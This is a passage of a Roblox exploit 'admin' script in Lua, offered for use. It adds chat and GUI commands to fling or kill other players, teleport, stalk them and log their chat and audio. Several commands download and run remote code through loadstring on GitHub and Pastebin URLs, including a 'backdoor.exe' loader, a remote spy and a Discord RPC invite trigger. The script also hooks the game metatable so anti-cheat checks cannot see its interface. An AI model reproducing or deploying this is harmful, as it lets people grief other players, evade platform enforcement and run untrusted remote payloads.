			character ~= char or not c.Connected
		
		lib.disconnect("pfling")
		if lp.Character == char then
			char:SetPrimaryPartCFrame(cf)
			bv:Destroy()
			char.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
			char.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
		end
	end
end)

cmd.add({"toolfling"}, {"toolfling", "Fling anyone that touches you using an accessory"}, function()
	lib.disconnect("pfling")
	local char = player.Character
	local hrp = char:FindFirstChild("HumanoidRootPart")
	local hum = char:FindFirstChildWhichIsA("Humanoid")
	local tors = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
	if char then
		local c = lib.connect("pfling", RunService.Stepped:Connect(function()
			for i, v in pairs(char:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = false
				end
			end
		end))
		tors.Anchored = true
		local tool = Instance.new("Tool", localPlayer.Backpack)
		local hat = char:FindFirstChildOfClass("Accessory")
		local hathandle = hat.Handle
		
		hathandle.Parent = tool
		hathandle.Massless = true
		tool.GripPos = Vector3.new(0, 9e99, 0)
		tool.Parent = localPlayer.Character
		
		repeat wait() until char:FindFirstChildOfClass("Tool") ~= nil
		tool.Grip = CFrame.new(Vector3.new(0, 0, 0))
		tors.Anchored = false
		
		repeat
			hrp.CFrame = hrp.CFrame
			wait()
		until not c.Connected
		
		hum:UnequipTools()
		hathandle.Parent = hat
		hathandle.Massless = false
		tool:Destroy()
	end
end)

cmd.add({"ungodmode", "untoolfling", "ungod"}, {"ungodmode", "Disable permanent fling"}, function()
	lib.disconnect("pfling")
end)

--[ PLAYER ]--
cmd.add({"orbit"}, {"orbit <player> <distance>", "Orbit around a player"}, function(p,d)
	lib.disconnect("orbit")
	local players = argument.getPlayers(p)
	local target = players[1]
	if not target then return end
	
	local tchar, char = target.Character, character
	local thrp = tchar:FindFirstChild("HumanoidRootPart")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	local dist = tonumber(d) or 4
	
	if tchar and char and thrp and hrp then
		local sineX, sineZ = 0, math.pi/2
		lib.connect("orbit", RunService.Stepped:Connect(function()
			sineX, sineZ = sineX + 0.05, sineZ + 0.05
			local sinX, sinZ = math.sin(sineX), math.sin(sineZ)
			if thrp.Parent and hrp.Parent then
				hrp.Velocity = Vector3.new(0, 0, 0)
				hrp.CFrame = CFrame.new(sinX * dist, 0, sinZ * dist) *
					(hrp.CFrame - hrp.CFrame.p) +
					thrp.CFrame.p
			end
		end))
	end
end)

cmd.add({"uporbit"}, {"uporbit <player> <distance>", "Orbit around a player on the Y axis"}, function(p,d)
	lib.disconnect("orbit")
	local players = argument.getPlayers(p)
	local target = players[1]
	if not target then return end
	
	local tchar, char = target.Character, character
	local thrp = tchar:FindFirstChild("HumanoidRootPart")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	local dist = tonumber(d) or 4
	
	if tchar and char and thrp and hrp then
		local sineX, sineY = 0, math.pi/2
		lib.connect("orbit", RunService.Stepped:Connect(function()
			sineX, sineY = sineX + 0.05, sineY + 0.05
			local sinX, sinY = math.sin(sineX), math.sin(sineY)
			if thrp.Parent and hrp.Parent then
				hrp.Velocity = Vector3.new(0, 0, 0)
				hrp.CFrame = CFrame.new(sinX * dist, sinY * dist, 0) *
					(hrp.CFrame - hrp.CFrame.p) +
					thrp.CFrame.p
			end
		end))
	end
end)

cmd.add({"unorbit"}, {"unorbit", "Stop orbiting a player"}, function()
	lib.disconnect("orbit")
end)

cmd.add({"fixcam", "fix"}, {"fixcam", "Fix your camera"}, function()
	camera.CameraSubject = character:FindFirstChildWhichIsA("Humanoid")
	camera.CameraType = camtype
end)

cmd.add({"fekill", "kill"}, {"fekill <player>", "Kill a player using a tool and FE god"}, function(p)
	local target = argument.getPlayers(p)[1]
	if not target then return end
	
	local char = character
	local tchar = target.Character
	local hrp = character:FindFirstChild("HumanoidRootPart")
	local hrp2 = tchar:FindFirstChild("HumanoidRootPart")
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	
	if hrp and hrp2 and backpack and hum then
		hum.Name = "1"
		local newHum = hum:Clone()
		newHum.Parent = char
		newHum.Name = "Humanoid"
			
		wait(0.1)
		hum:Destroy()
		camera.CameraSubject = char
		newHum.DisplayDistanceType = "None"
		wait(0.1)
		
		for i, v in pairs(localPlayer.Backpack:GetChildren()) do
			v.Parent = char
			hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
			RunService.Stepped:Wait(0)
		end
		
		local n = 0
		repeat
			RunService.RenderStepped:Wait(0)
			n = n + 1
			hrp.CFrame = hrp2.CFrame
		until (not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or tchar:FindFirstChild("RightGrip", true) or n > 250) and n > 2
		
		hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5,999999)
		camera.CameraType = Enum.CameraType.Custom
	end
end)

cmd.add({"fling"}, {"fling <player>", "Fling the given player"}, function(p)
	local players = argument.getPlayers(p)
	local char = player.Character
	local hum = char:FindFirstChildWhichIsA("Humanoid")
	local cf = char.HumanoidRootPart.CFrame
	for i, plr in pairs(players) do
		if char and plr and plr.Character then
			local enemy = plr.Character
			local bv = Instance.new("BodyAngularVelocity", char.HumanoidRootPart)
			bv.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bv.P = math.huge
			bv.AngularVelocity = Vector3.new(9e5, 9e5, 0)
			bv.Name = "hum"
			
			wait()
			char.HumanoidRootPart.CFrame = cf
			
			for i,v in pairs(char:GetDescendants()) do
				if v:IsA('BasePart') then
					v.Massless = true
				end
			end
			
			local c = lib.connect("fling", game:GetService('RunService').Stepped:Connect(function()
				for i,v in pairs(char:GetDescendants()) do
					if v:IsA('BasePart') then
						v.CanCollide = false
						v.Velocity = Vector3.new(0, 0, 0)
					end
				end
				if char.PrimaryPart and enemy.PrimaryPart then
					char.HumanoidRootPart.CFrame = enemy.HumanoidRootPart.CFrame
					char.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
				end
			end))
			repeat
				wait()
			until
				character ~= char or not enemy or not enemy.Parent or not c.Connected or not enemy.PrimaryPart or enemy.PrimaryPart.Velocity.magnitude > 100
			
			lib.disconnect("fling")
			if lp.Character == char then
				char:SetPrimaryPartCFrame(cf)
				bv:Destroy()
				char.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
				char.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
			end
			if not c.Connected then
				break
			end
		end
	end
end)
cmd.add({"unfling"}, {"unfling", "Stop all attempts to fling"}, function()
	lib.disconnect("fling")
end)

cmd.add({"goto", "to", "tp", "teleport"}, {"goto <player/X,Y,Z>", "Teleport to the given player or X,Y,Z coordinates"}, function(p)
	local players = argument.getPlayers(p)
	local pos = lib.parseText(p, opt.tupleSeparator)
	if character then
		if pos and #pos == 3 then
			local x,y,z = pos[1], pos[2], pos[3]
			character:MoveTo(Vector3.new(x, y, z))
		elseif players[1] and players[1].Character then
			character:MoveTo((players[1].Character:GetPrimaryPartCFrame() * CFrame.new(1, 0, 2)).p)
		end
	end
end)

cmd.add({"watch", "view"}, {"watch <player>", "Watch the given player"}, function(p)
	local players = argument.getPlayers(p)
	if players[1] and players[1].Character then
		camera.CameraSubject = players[1].Character:FindFirstChildWhichIsA("Humanoid")
	end
end)
cmd.add({"unwatch", "unview"}, {"unwatch", "Stop watching a player"}, function()
	if character then
		camera.CameraSubject = character:FindFirstChildWhichIsA("Humanoid")
	end
end)

cmd.add({"hydrogen"}, {"hydrogen", "executes hydrogen the remote spy script lol"}, function()
	local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
end)

cmd.add({"backdoor"}, {"backdoor", "loads in backdoor.exe"}, function()
    local httpService = game:GetService("HttpService");

    local invCode = "xJHCqm84cW";
    local httpRequest = (syn and syn.request) or http_request or function() end;
    
    local function launchDiscord()
        if not httpRequest then warn("Exploit not supported. No HTTP found.") return end
        
        httpRequest({
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
        
            Headers = {
                ['Content-Type'] = 'application/json',
                Origin = 'https://discord.com'
            },
        
            Body = httpService:JSONEncode({
                cmd = 'INVITE_BROWSER',
                nonce = httpService:GenerateGUID(false),
                args = {code = invCode}
            })
        })
    end;
    
    local NotificationBindable = Instance.new("BindableFunction")
    NotificationBindable.OnInvoke = launchDiscord
    
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {
            Title = "backdoor.exe",
            Duration = 5,
            Text = "Loading lastest version!\n\nJoin our Discord for games, scripts and more",
            Button1 = "Join Discord!",
            Callback = NotificationBindable
        }
    )
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
    
    
    
    --	k4scripts
    --	.------.
    --	|4.--. |
    --	| :│/: |
    --	| :│\: |
    --	| '--'4|
    --	`------'    
end)

cmd.add({"copyaudio", "getaudio"}, {"copyaudio <player>", "Copy all sounds a player is playing to your clipboard  -Cyrus"}, function(p)
	local players = argument.getPlayers(p)
	local audios = ""
	for _, player in pairs(players) do
		local char = player.Character
		if char then
			audios = audios .. ("<<[ %s ]>>"):format(player.Name)
			for i, v in pairs(char:GetDescendants()) do
				if v:IsA("Sound") and v.Playing then
					audios = audios .. ("\n[ %s ]: %s"):format(v.Name, v.SoundId)
				end
			end
		end
	end
	setclipboard(audios)
end)

cmd.add({"saveaudio", "stealaudio", "steal"}, {"saveaudio <player>", "Save all sounds a player is playing to a file  -Cyrus"}, function(p)
	local players = argument.getPlayers(p)
	local audios = ""
	for _, player in pairs(players) do
		local char = player.Character
		if char then
			audios = audios .. ("<<[ %s ]>>"):format(player.Name)
			for i, v in pairs(char:GetDescendants()) do
				if v:IsA("Sound") and v.Playing then
					audios = audios .. ("\n[ %s ]: %s"):format(v.Name, v.SoundId)
				end
			end
		end
	end
	writefile(("Audio-Logs_%c"):format(math.random(1000, 9999)), audios)
end)

cmd.add({"follow", "stalk", "walk"}, {"follow <player>", "Follow a player wherever they go"}, function(p)
	lib.disconnect("follow")
	local players = argument.getPlayers(p)
	local targetPlayer = players[1]
	lib.connect("follow", RunService.Stepped:Connect(function()
		local target = targetPlayer.Character
		if target and character then
			local hum = character:FindFirstChildWhichIsA("Humanoid")
			if hum then
				local targetPart = target:FindFirstChild("Head")
				local targetPos = targetPart.Position
				hum:MoveTo(targetPos)
			end
		end
	end))
end)

cmd.add({"pathfind"}, {"pathfind <player>", "Follow a player using the pathfinder API wherever they go"}, function(p)
	lib.disconnect("follow")
	local players = argument.getPlayers(p)
	local targetPlayer = players[1]
	local debounce = false
	lib.connect("follow", RunService.Stepped:Connect(function()
		if debounce then return end
		debounce = true
		local target = targetPlayer.Character
		if target and character then
			local hum = character:FindFirstChildWhichIsA("Humanoid")
			local main = target:FindFirstChild("HumanoidRootPart")
			if hum then
				local targetPart = target:FindFirstChild("HumanoidRootPart") or target:FindFirstChild("Head")
				local targetPos = (targetPart.CFrame * CFrame.new(0, 0, -0.5)).p
				local PathService = game:GetService("PathfindingService")
				local path = PathService:CreatePath({
					AgentRadius = 2,
					AgentHeight = 5,
					AgentCanJump = true
				})
				local points = path:ComputeAsync(main.Position, targetPos)
				
				if path.Status then
					local waypoints = path:GetWaypoints()
					for i, waypoint in pairs(waypoints) do
						if i > 2 then break end
						if waypoint.Action == Enum.PathWaypointAction.Jump then
							hum.Jump = true
						end
						hum:MoveTo(waypoint.Position)
						local distance = 5
						repeat
							wait()
							distance = (waypoint.Position - main.Position).magnitude
						until
							(targetPos - targetPart.Position).magnitude > 2 or distance < 1

						if (targetPos - targetPart.Position).magnitude > 2 then
							break
						end
					end
				end
			end
		end
		debounce = false
	end))
end)

cmd.add({"unfollow", "unstalk", "unwalk", "unpathfind"}, {"unfollow", "Stop all attempts to follow a player"}, function()
	lib.disconnect("follow")
end)

cmd.add({"r6"}, {"r6", "Makes your character support R6 scripts while in R15"}, function()
	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Gelatekussy/GelatekHub/main/src/lib/Reanimate.lua"))()
end)

cmd.add({"invisible"}, {"invisible", "Gives you an invisible tool"}, function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0wE8rKJ1"))()
end)

cmd.add({"cid", "setcreatorid"}, {"cid", "sets the id to the creator's id"}, function()
	if game.CreatorType == Enum.CreatorType.User then
		game.Players.LocalPlayer.UserId = game.CreatorId
		end
		if game.CreatorType == Enum.CreatorType.Group then
		game.Players.LocalPlayer.UserId = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId).Owner.Id
		end
end)

--[[ FUNCTIONALITY ]]--
localPlayer.Chatted:Connect(function(str)
	lib.parseCommand(str)
end)

--[[ GUI VARIABLES ]]--
local ScreenGui
if not RunService:IsStudio() then
	ScreenGui = game:GetObjects("rbxassetid://12095186225")[1]
else
	repeat wait() until player:FindFirstChild("AdminUI", true)
	ScreenGui = player:FindFirstChild("AdminUI", true)
end

local description = ScreenGui.Description
local cmdBar = ScreenGui.CmdBar
	local centerBar = cmdBar.CenterBar
		local cmdInput = centerBar.Input
	local cmdAutofill = cmdBar.Autofill
		local cmdExample = cmdAutofill.Cmd
	local leftFill = cmdBar.LeftFill
	local rightFill = cmdBar.RightFill
local chatLogsFrame = ScreenGui.ChatLogs
	local chatLogs = chatLogsFrame.Container.Logs
		local chatExample = chatLogs.TextLabel
local commandsFrame = ScreenGui.Commands
	local commandsFilter = commandsFrame.Container.Filter
	local commandsList = commandsFrame.Container.List
		local commandExample = commandsList.TextLabel
local resizeFrame = ScreenGui.Resizeable
local resizeXY = {
	Top		= {Vector2.new(0, -1),	Vector2.new(0, -1),	"rbxassetid://2911850935"},
	Bottom	= {Vector2.new(0, 1),	Vector2.new(0, 0),	"rbxassetid://2911850935"},
	Left	= {Vector2.new(-1, 0),	Vector2.new(1, 0),	"rbxassetid://2911851464"},
	Right	= {Vector2.new(1, 0),	Vector2.new(0, 0),	"rbxassetid://2911851464"},
	
	TopLeft		= {Vector2.new(-1, -1),	Vector2.new(1, -1),	"rbxassetid://2911852219"},
	TopRight	= {Vector2.new(1, -1),	Vector2.new(0, -1),	"rbxassetid://2911851859"},
	BottomLeft	= {Vector2.new(-1, 1),	Vector2.new(1, 0),	"rbxassetid://2911851859"},
	BottomRight	= {Vector2.new(1, 1),	Vector2.new(0, 0),	"rbxassetid://2911852219"},
}

cmdExample.Parent = nil
chatExample.Parent = nil
commandExample.Parent = nil
resizeFrame.Parent = nil

local rPlayer = Players:FindFirstChildWhichIsA("Player")
local coreGuiProtection = {}

pcall(function()
	for i, v in pairs(ScreenGui:GetDescendants()) do
		coreGuiProtection[v] = rPlayer.Name
	end
	ScreenGui.DescendantAdded:Connect(function(v)
		coreGuiProtection[v] = rPlayer.Name
	end)
	coreGuiProtection[ScreenGui] = rPlayer.Name
	 
	local meta = getrawmetatable(game)
	local tostr = meta.__tostring
	setreadonly(meta, false)
	meta.__tostring = newcclosure(function(t)
		if coreGuiProtection[t] and not checkcaller() then
			return coreGuiProtection[t]
		end
		return tostr(t)
	end)
end)
if not RunService:IsStudio() then
	local newGui = game:GetService("CoreGui"):FindFirstChildWhichIsA("ScreenGui")
	newGui.DescendantAdded:Connect(function(v)
		coreGuiProtection[v] = rPlayer.Name
	end)
	for i, v in pairs(ScreenGui:GetChildren()) do
		v.Parent = newGui
	end
	ScreenGui = newGui
end

--[[ GUI FUNCTIONS ]]--
gui = {}
gui.txtSize = function(ui, x, y)
	local textService = game:GetService("TextService")
	return textService:GetTextSize(ui.Text, ui.TextSize, ui.Font, Vector2.new(x, y))
end
gui.commands = function()
	if not commandsFrame.Visible then
		commandsFrame.Visible = true
		commandsList.CanvasSize = UDim2.new(0, 0, 0, 0)
	end
	for i, v in pairs(commandsList:GetChildren()) do
		if v:IsA("TextLabel") then
			Destroy(v)
		end
	end
	local i = 0
	for cmdName, tbl in pairs(Commands) do
		local Cmd = commandExample:Clone()
		Cmd.Parent = commandsList
		Cmd.Name = cmdName
		Cmd.Text = " " .. tbl[2][1]
		Cmd.MouseEnter:Connect(function()
			description.Visible = true
			description.Text = tbl[2][2]
		end)
		Cmd.MouseLeave:Connect(function()
			if description.Text == tbl[2][2] then
				description.Visible = false
				description.Text = ""
			end
		end)
		i = i + 1
	end
	commandsList.CanvasSize = UDim2.new(0, 0, 0, i*20+10)
	commandsFrame.Position = UDim2.new(0.5, -283/2, 0.5, -260/2)
end
gui.chatlogs = function()
	if not chatLogsFrame.Visible then
		chatLogsFrame.Visible = true
	end
	chatLogsFrame.Position = UDim2.new(0.5, -283/2+5, 0.5, -260/2+5)
end

gui.tween = function(obj, style, direction, duration, goal)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle[style], Enum.EasingDirection[direction])
	local tween = TweenService:Create(obj, tweenInfo, goal)
	tween:Play()
	return tween
end
gui.mouseIn = function(guiObject, range)
	local pos1, pos2 = guiObject.AbsolutePosition, guiObject.AbsolutePosition + guiObject.AbsoluteSize
	local mX, mY = mouse.X, mouse.Y
	if mX > pos1.X-range and mX < pos2.X+range and mY > pos1.Y-range and mY < pos2.Y+range then
		return true
	end
	return false
end
gui.resizeable = function(ui, min, max)
	local rgui = resizeFrame:Clone()
	rgui.Parent = ui
	
	local mode
	local UIPos
	local lastSize
	local lastPos = Vector2.new()
	
	local function update(delta)
		local xy = resizeXY[(mode and mode.Name) or '']
		if not mode or not xy then return end
		local delta = (delta * xy[1]) or Vector2.new()
		local newSize = Vector2.new(lastSize.X + delta.X, lastSize.Y + delta.Y)
		newSize = Vector2.new(
			math.clamp(newSize.X, min.X, max.X),
			math.clamp(newSize.Y, min.Y, max.Y)
		)
		ui.Size = UDim2.new(0, newSize.X, 0, newSize.Y)
		ui.Position = UDim2.new(
			UIPos.X.Scale, 
			UIPos.X.Offset + (-(newSize.X - lastSize.X) * xy[2]).X, 
			UIPos.Y.Scale, 
			UIPos.Y.Offset + (delta * xy[2]).Y
		)
	end
	
	mouse.Move:Connect(function()
		update(Vector2.new(mouse.X, mouse.Y) - lastPos)
	end)
	
	for _, button in pairs(rgui:GetChildren()) do
		local isIn = false
		button.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				mode = button
				lastPos = Vector2.new(mouse.X, mouse.Y)
				lastSize = ui.AbsoluteSize
				UIPos = ui.Position
			end
		end)
		button.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				mode = nil
			end
		end)
		button.MouseEnter:Connect(function()
			mouse.Icon = resizeXY[button.Name][3]
		end)
		button.MouseLeave:Connect(function()
			if mouse.Icon == resizeXY[button.Name][3] then
				mouse.Icon = ""
			end
		end)
	end
end
gui.draggable = function(ui, dragui)
	if not dragui then dragui = ui end
	local UserInputService = game:GetService("UserInputService")
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		ui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	dragui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = ui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	dragui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
gui.menuify = function(menu)
	local exit = menu:FindFirstChild("Exit", true)
	local mini = menu:FindFirstChild("Minimize", true)
	local minimized = false
	local sizeX, sizeY = Instance.new("IntValue", menu), Instance.new("IntValue", menu)
	mini.MouseButton1Click:Connect(function()
		minimized = not minimized
		if minimized then
			sizeX.Value = menu.Size.X.Offset
			sizeY.Value = menu.Size.Y.Offset
			gui.tween(menu, "Quart", "Out", 0.5, {Size = UDim2.new(0, 200, 0, 25)})
		else
			gui.tween(menu, "Quart", "Out", 0.5, {Size = UDim2.new(0, sizeX.Value, 0, sizeY.Value)})
		end
	end)
	exit.MouseButton1Click:Connect(function()
		menu.Visible = false
	end)
	gui.draggable(menu, menu.Topbar)
	menu.Visible = false
end
gui.barSelect = function(speed)
	centerBar.Visible = true
	gui.tween(centerBar, "Sine", "Out", speed or 0.25, {Size = UDim2.new(0, 250, 1, 15)})
	gui.tween(leftFill, "Quad", "Out", speed or 0.3, {Position = UDim2.new(0, 0, 0.5, 0)})
	gui.tween(rightFill, "Quad", "Out", speed or 0.3, {Position = UDim2.new(1, 0, 0.5, 0)})
	gui.loadCommands()
end
gui.barDeselect = function(speed)
	gui.tween(centerBar, "Sine", "Out", speed or 0.25, {Size = UDim2.new(0, 250, 0, 0)})
	gui.tween(leftFill, "Sine", "In", speed or 0.3, {Position = UDim2.new(-0.5, 100, 0.5, 0)})
	gui.tween(rightFill, "Sine", "In", speed or 0.3, {Position = UDim2.new(1.5, -100, 0.5, 0)})
	for i, v in pairs(cmdAutofill:GetChildren()) do
		if v:IsA("Frame") then
			wrap(function()
				wait(math.random(1, 200)/2000)
				gui.tween(v, "Back", "In", 0.35, {Size = UDim2.new(0, 0, 0, 25)})
			end)
		end
	end
end
gui.loadCommands = function()
	for i, v in pairs(cmdAutofill:GetChildren()) do
		if v.Name ~= "UIListLayout" then
			Destroy(v)
		end
	end
	local last = nil
	local i = 0
	for name, tbl in pairs(Commands) do
		local info = tbl[2]
		local btn = cmdExample:Clone()
		btn.Parent = cmdAutofill
		btn.Name = name
		btn.Input.Text = info[1]
		i = i + 1
		
		local size = btn.Size
		btn.Size = UDim2.new(0, 0, 0, 25)
		btn.Size = size
	end
end
gui.searchCommands = function()
	local _1, _2, _3, _0 = {}, {}, {}, {}
	local str = cmdInput.Text:gmatch("[^ ;]+")()
	if str then str = str:lower() else str = "" end
	
	for i, v in pairs(cmdAutofill:GetChildren()) do
		if v:IsA("Frame") then
			local found = Commands[v.Name]
			if Commands[v.Name] then
				if str ~= "" and v.Name:find(str) == 1 then
					v.LayoutOrder = 1
					table.insert(_1, v)
				end
				if str ~= "" and v.Name:find(str) and v.LayoutOrder ~= 1 then
					v.LayoutOrder = 2
					table.insert(_2, v)
				end
				if str == "" or v.Name:find(str) == nil then
					v.LayoutOrder = 3
					table.insert(_3, v)
				end
			end
			for CmdName, tbl in pairs(Aliases) do
				if Commands[v.Name][1] == tbl[1] then
					if str ~= "" and CmdName:find(str) == 1 then
						v.LayoutOrder = 1
						table.insert(_1, v)
					end
					if str ~= "" and CmdName:find(str) then
						v.LayoutOrder = 2
						table.insert(_2, v)
					end
					if str == "" or CmdName:find(str) == nil then
						v.LayoutOrder = 3
						table.insert(_3, v)
					end
					break
				end
			end
		end
	end
	
	for i, v in pairs(_1) do if not lib.find(_0, v) then table.insert(_0, v) end end
	for i, v in pairs(_2) do if not lib.find(_0, v) then table.insert(_0, v) end end
	for i, v in pairs(_3) do if not lib.find(_0, v) then table.insert(_0, v) end end
	
	local last
	for i, v in pairs(_0) do
		local n = (i ^ -0.5) * 125
		if last then
			local pos = last.Value.Value
			local newPos = UDim2.new(0.5, 0, 0, pos + 25 + 3)
			gui.tween(v, "Quint", "Out", 0.3, {
				Size = UDim2.new(0.5, n, 0, 25)
			})
			v.Value.Value = newPos.Y.Offset
			v.LayoutOrder = i
		else
			gui.tween(v, "Quint", "Out", 0.3, {
				Size = UDim2.new(0.5, n, 0, 25)
			})
			v.Value.Value = 0
			v.LayoutOrder = i
		end
		last = v
	end
end

--[[ GUI FUNCTIONALITY ]]--
mouse.KeyDown:Connect(function(k)
	if k:lower() == opt.prefix then
		gui.barSelect()
		cmdInput.Text = ''
		cmdInput:CaptureFocus()
	end
end)

cmdInput.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		wrap(function()
			lib.parseCommand(opt.prefix .. cmdInput.Text)
		end)
	end
	gui.barDeselect()
end)

cmdInput.Changed:Connect(function(p)
	if p ~= "Text" then return end
	gui.searchCommands()
end)

gui.barDeselect(0)
cmdBar.Visible = true
gui.menuify(chatLogsFrame)
gui.menuify(commandsFrame)
gui.resizeable(chatLogsFrame, Vector2.new(173,58), Vector2.new(1000,1000))
gui.resizeable(commandsFrame, Vector2.new(184,84), Vector2.new(1000,1000))

commandsFilter.Changed:Connect(function(p)
	if p ~= "Text" then return end
	for i, v in pairs(commandsList:GetChildren()) do
		if v:IsA("TextLabel") then
			if v.Name:find(commandsFilter.Text:lower()) and v.Name:find(commandsFilter.Text:lower()) <= 2 then
				v.Visible = true
			else
				v.Visible = false
			end
		end
	end
end)

local function bindToChat(plr, msg)
	local chatMsg = chatExample:Clone()
	for i, v in pairs(chatLogs:GetChildren()) do
		if v:IsA("TextLabel") then
			v.LayoutOrder = v.LayoutOrder + 1
		end
	end
	chatMsg.Parent = chatLogs
	chatMsg.Text = ("[%s]: %s"):format(plr.Name, msg)
	
	local txtSize = gui.txtSize(chatMsg, chatMsg.AbsoluteSize.X, 100)
	chatMsg.Size = UDim2.new(1, -5, 0, txtSize.Y)
end

for i, plr in pairs(Players:GetPlayers()) do
	plr.Chatted:Connect(function(msg)
		bindToChat(plr, msg)
	end)
end
Players.PlayerAdded:Connect(function(plr)
	plr.Chatted:Connect(function(msg)
		bindToChat(plr, msg)
	end)
end)

mouse.Move:Connect(function()
	description.Position = UDim2.new(0, mouse.X, 0, mouse.Y)
	local size = gui.txtSize(description, 200, 100)
	description.Size = UDim2.new(0, size.X, 0, size.Y)
end)

RunService.Stepped:Connect(function()
	chatLogs.CanvasSize = UDim2.new(0, 0, 0, chatLogs.UIListLayout.AbsoluteContentSize.Y)
	commandsList.CanvasSize = UDim2.new(0, 0, 0, commandsList.UIListLayout.AbsoluteContentSize.Y)
end)

function Destroy(guiObject)
	if not pcall(function()guiObject.Parent = game:GetService("CoreGui")end) then
		guiObject.Parent = nil
	end
end
wait(.5)
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui55 = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local ImageLabel = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")

--Properties:

ScreenGui55.Name = "ScreenGui55"
ScreenGui55.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui55.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui55
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 0.170
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.423606783, 0, 0, 0)
Frame.Size = UDim2.new(0, 263, 0, 60)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(10, 22, 41)), ColorSequenceKeypoint.new(0.26, Color3.fromRGB(17, 28, 44)), ColorSequenceKeypoint.new(0.51, Color3.fromRGB(17, 30, 47)), ColorSequenceKeypoint.new(0.76, Color3.fromRGB(21, 43, 53)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(14, 29, 47))}
UIGradient.Offset = Vector2.new(-0.014400024, 0.0150001524)
UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.00), NumberSequenceKeypoint.new(0.48, 0.00), NumberSequenceKeypoint.new(1.00, 0.00)}
UIGradient.Parent = Frame

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.108166613, 0, 0.150000006, 0)
ImageLabel.Size = UDim2.new(0, 206, 0, 42)
ImageLabel.Image = "http://www.roblox.com/asset/?id=12094592378"

UICorner.Parent = Frame
ScreenGui55.ResetOnSpawn = false
wait(1)
local Players = game:FindService("Players")

require(game:GetService("Chat"):WaitForChild("ClientChatModules").ChatSettings).PlayerDisplayNamesEnabled = false

local function rename(character,name)
    repeat task.wait() until character:FindFirstChildWhichIsA("Humanoid")
    character:FindFirstChildWhichIsA("Humanoid").DisplayName = name
end

for i,v in next, Players:GetPlayers() do
    if v.Character then
        v.DisplayName = v.Name
        rename(v.Character,v.Name)
    end
    v.CharacterAdded:Connect(function(char)
        rename(char,v.Name)
    end)
end

Players.PlayerAdded:Connect(function(plr)
    plr.DisplayName = plr.Name
    plr.CharacterAdded:Connect(function(char)
        rename(char,plr.Name)
    end)
end)
